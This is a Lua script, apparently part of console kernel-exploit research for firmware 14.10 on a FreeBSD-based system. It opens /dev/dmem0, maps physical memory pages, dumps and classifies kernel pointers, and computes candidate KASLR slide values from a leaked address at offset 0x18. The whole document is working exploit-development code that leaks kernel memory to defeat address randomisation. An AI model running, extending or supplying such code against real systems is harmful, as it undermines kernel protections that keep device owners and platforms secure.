-- 14.10 Recon Probe 17: Deep dump of dmem0 offset 0 kernel pointers
-- Probe 16 found 5 kernel pointers at offset 0 including 0xffffffff2ec47fc0
-- This probe does a thorough dump to extract KASLR base

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DMEM KPTR DUMP ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6,
    sc_mmap = 477, sc_munmap = 73,
    sc_getpid = 20,
})

local dmem_fd = -1
local ok, ret = pcall(function() return syscall.sc_open("/dev/dmem0", 0):tonumber() end)
if ok and ret >= 0 then dmem_fd = ret end
log("dmem0 fd: " .. dmem_fd)

local PAGE = 0x4000

-- ============================================================
-- PART 1: Full qword dump of offset 0 (first 16KB page)
-- ============================================================
log("")
log("--- PART 1: offset 0 full dump ---")

local addr = 0
local m_ok, m_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0)
end)
if m_ok then addr = m_ret:tonumber() end

if addr == 0 or addr == 0xFFFFFFFFFFFFFFFF then
    log("mmap failed")
    return table.concat(out, "\n")
end
log("mapped at " .. string.format("0x%x", addr))

-- Dump ALL non-zero qwords
local all_ptrs = {}
local nonzero_count = 0
for i = 0, PAGE - 8, 8 do
    local lo = memory.read_dword(addr + i):tonumber()
    local hi = memory.read_dword(addr + i + 4):tonumber()
    if lo ~= 0 or hi ~= 0 then
        nonzero_count = nonzero_count + 1
        local tag = ""
        if hi >= 0xFFFFFFFF and lo >= 0x80000000 then
            tag = " [KTEXT]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "KTEXT"}
        elseif hi >= 0xFFFFF800 and hi < 0xFFFFFF00 then
            tag = " [DMAP]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "DMAP"}
        elseif hi >= 0xFFFF0000 then
            tag = " [KHIGH]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "KHIGH"}
        elseif hi == 0xFFFFFFFF then
            tag = " [KLOW]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "KLOW"}
        end
        log(string.format("  +%04x: %08x%08x%s", i, hi, lo, tag))
    end
end
log("")
log("nonzero qwords: " .. nonzero_count)
log("kernel pointers: " .. #all_ptrs)

pcall(function() syscall.sc_munmap(addr, PAGE) end)

-- ============================================================
-- PART 2: Remap and check stability (same values each time?)
-- If values change between mappings, it's live hardware state
-- ============================================================
log("")
log("--- PART 2: stability check ---")

for round = 1, 3 do
    local a2 = 0
    local m2_ok, m2_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0)
    end)
    if m2_ok then a2 = m2_ret:tonumber() end

    if a2 ~= 0 and a2 ~= 0xFFFFFFFFFFFFFFFF then
        -- Check the known kernel pointer at +0x18
        local lo18 = memory.read_dword(a2 + 0x18):tonumber()
        local hi18 = memory.read_dword(a2 + 0x1C):tonumber()
        -- And the first qword
        local lo00 = memory.read_dword(a2):tonumber()
        local hi00 = memory.read_dword(a2 + 4):tonumber()

        log(string.format("  round %d: @+0=%08x%08x @+18=%08x%08x",
            round, hi00, lo00, hi18, lo18))

        pcall(function() syscall.sc_munmap(a2, PAGE) end)
    end
end

-- ============================================================
-- PART 3: Offset 0x10000 dump (1963 non-zero qwords)
-- ============================================================
log("")
log("--- PART 3: offset 0x10000 dump ---")

local a3 = 0
local m3_ok, m3_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0x10000)
end)
if m3_ok then a3 = m3_ret:tonumber() end

if a3 ~= 0 and a3 ~= 0xFFFFFFFFFFFFFFFF then
    -- Find the kernel pointer
    local kptrs3 = {}
    for i = 0, PAGE - 8, 8 do
        local lo = memory.read_dword(a3 + i):tonumber()
        local hi = memory.read_dword(a3 + i + 4):tonumber()
        if hi >= 0xFFFF0000 then
            kptrs3[#kptrs3 + 1] = {off = i, hi = hi, lo = lo}
        end
    end

    if #kptrs3 > 0 then
        log("  kernel pointers:")
        for _, p in ipairs(kptrs3) do
            log(string.format("    +%04x: 0x%08x%08x", p.off, p.hi, p.lo))
        end
    end

    -- Dump first 128 bytes
    log("  first 128 bytes:")
    for i = 0, 120, 8 do
        local lo = memory.read_dword(a3 + i):tonumber()
        local hi = memory.read_dword(a3 + i + 4):tonumber()
        log(string.format("    +%04x: %08x%08x", i, hi, lo))
    end

    -- Sample the dense area (find where the non-zero data starts/ends)
    local first_nz = -1
    local last_nz = -1
    for i = 0, PAGE - 8, 8 do
        local lo = memory.read_dword(a3 + i):tonumber()
        local hi = memory.read_dword(a3 + i + 4):tonumber()
        if lo ~= 0 or hi ~= 0 then
            if first_nz < 0 then first_nz = i end
            last_nz = i
        end
    end
    log(string.format("  data range: 0x%04x - 0x%04x", first_nz, last_nz))

    pcall(function() syscall.sc_munmap(a3, PAGE) end)
else
    log("  mmap failed")
end

-- ============================================================
-- PART 4: Fine-grained offset scan around page 0
-- Check every page in the first 256KB
-- ============================================================
log("")
log("--- PART 4: fine scan 0-256KB ---")

for off = 0, 0x3C000, PAGE do
    local a4 = 0
    local m4_ok, m4_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, off)
    end)
    if m4_ok then a4 = m4_ret:tonumber() end

    if a4 ~= 0 and a4 ~= 0xFFFFFFFFFFFFFFFF then
        local nz = 0
        local kp = 0
        for i = 0, PAGE - 8, 64 do -- sample every 64 bytes
            local lo = memory.read_dword(a4 + i):tonumber()
            local hi = memory.read_dword(a4 + i + 4):tonumber()
            if lo ~= 0 or hi ~= 0 then nz = nz + 1 end
            if hi >= 0xFFFF0000 then kp = kp + 1 end
        end
        if nz > 0 then
            log(string.format("  off=0x%05x: nz_samples=%d kptr_samples=%d", off, nz, kp))
        end
        pcall(function() syscall.sc_munmap(a4, PAGE) end)
    end
end

-- ============================================================
-- PART 5: KASLR computation
-- If 0xffffffff2ec47fc0 is a kernel pointer, the KASLR slide
-- is (leaked_addr - known_symbol_offset)
-- FreeBSD kernel base without KASLR: 0xFFFFFFFF80200000
-- The offset 0x2ec47fc0 - 0x80200000 = 0xAEA47FC0
-- So KASLR slide = 0xAEA47FC0 (if this is a kernel text ptr)
-- ============================================================
log("")
log("--- PART 5: KASLR analysis ---")

-- Re-read the pointer
local a5 = 0
local m5_ok, m5_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0)
end)
if m5_ok then a5 = m5_ret:tonumber() end

if a5 ~= 0 and a5 ~= 0xFFFFFFFFFFFFFFFF then
    local lo18 = memory.read_dword(a5 + 0x18):tonumber()
    local hi18 = memory.read_dword(a5 + 0x1C):tonumber()
    log(string.format("  ptr at +0x18: 0x%08x%08x", hi18, lo18))

    if hi18 == 0xFFFFFFFF then
        local full = hi18 * 0x100000000 + lo18
        log(string.format("  if kernel base=0xFFFFFFFF80200000:"))
        log(string.format("    slide = 0x%08x", lo18 - 0x80200000))
        log(string.format("  if kernel base=0xFFFFFFFF80000000:"))
        log(string.format("    slide = 0x%08x", lo18 - 0x80000000))
        log(string.format("  if kernel base=0xFFFFFFFF82200000:"))
        log(string.format("    slide = 0x%08x", lo18 - 0x82200000))
    end

    -- Also check all other kernel-like pointers for consistency
    for _, off_check in ipairs({0x318, 0x330, 0x378, 0x3F0}) do
        if off_check < PAGE then
            local lo_c = memory.read_dword(a5 + off_check):tonumber()
            local hi_c = memory.read_dword(a5 + off_check + 4):tonumber()
            log(string.format("  ptr at +0x%03x: 0x%08x%08x", off_check, hi_c, lo_c))
        end
    end

    pcall(function() syscall.sc_munmap(a5, PAGE) end)
end

pcall(function() syscall.sc_close(dmem_fd) end)

log("")
log("=== DMEM KPTR DUMP DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
